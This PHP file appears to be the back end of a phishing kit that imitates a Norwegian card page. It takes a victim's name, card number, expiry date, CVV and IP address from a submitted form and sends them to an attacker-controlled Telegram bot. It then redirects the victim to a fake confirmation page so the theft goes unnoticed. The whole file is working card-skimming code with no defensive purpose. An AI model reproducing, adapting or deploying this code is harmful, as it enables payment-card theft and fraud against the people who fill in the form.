<?php
$ip = getenv("REMOTE_ADDR");
$message .= "------------Card Norwegian---\n";
$message .= "Full Name   : ".$_POST['nom']."\n";
$message .= "Card Number   : ".$_POST['cc']."\n";
$message .= "exp date   : ".$_POST['exp']."\n";
$message .= "Cvv   : ".$_POST['cvv']."\n";
$message .= "-------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------------------------------------------\n";
$token = "<TOKEN_REMOVED>";
$data = [
    'text' => $message,
    'chat_id' => '1221067626 '
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

echo '<script language="Javascript">
<!--
document.location.replace("../confirm.html");
// -->
</script>';



?>
